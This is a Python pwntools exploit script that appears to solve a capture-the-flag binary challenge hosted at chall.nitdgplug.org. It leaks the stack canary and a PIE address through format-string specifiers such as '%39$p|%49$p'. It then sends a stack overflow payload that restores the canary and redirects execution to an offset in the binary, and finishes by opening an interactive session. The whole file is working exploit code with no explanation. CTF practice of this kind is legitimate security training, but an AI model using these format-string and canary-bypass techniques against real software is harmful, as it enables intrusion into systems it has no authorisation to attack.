#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall')
context.terminal = ['kitty', '-e', 'sh', '-c']
host = args.HOST or 'chall.nitdgplug.org'
port = int(args.PORT or 30511)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *battle+146
continue
'''.format(**locals())

# -- Exploit goes here --
# context.log_level = 'warn'
def leak_canary():
	for i in range(500):
		io = start()
		io.recv()
		io.sendline(f"%{i}$p")
		# print(io.recv())
		leak = io.recvuntil("spit").strip(b"spit")
		try:
			leak = int(leak, 16)
		except:
			leak = 0xdeadbeef
		print(i, hex(leak))
		io.close()
# leak_canary()
io = start()
canary = "%39$p|%49$p"
io.recvuntil("!\n")
io.sendline(canary)
canary = io.recvuntil("|").strip(b"|")
pie = io.recvuntil("spit").strip(b"spit")
print(canary)
print(pie)
try:
		canary = int(canary, 16)
		pie = int(pie, 16)
except:
		canary = 0xdeadbeef
		pie = 0xdeadbeef
exe.address = pie - 0x1360
log.info(f"CANARY LEAK : {hex(canary)}")
log.info(f"PIE LEAK : {hex(pie)}")
io.recv()
payload = b"Spitfire\x00" + b"A" * 255 + p64(canary) + b"A" * 8 + p64(exe.address + 0x1229)
io.sendline(payload)

io.interactive()

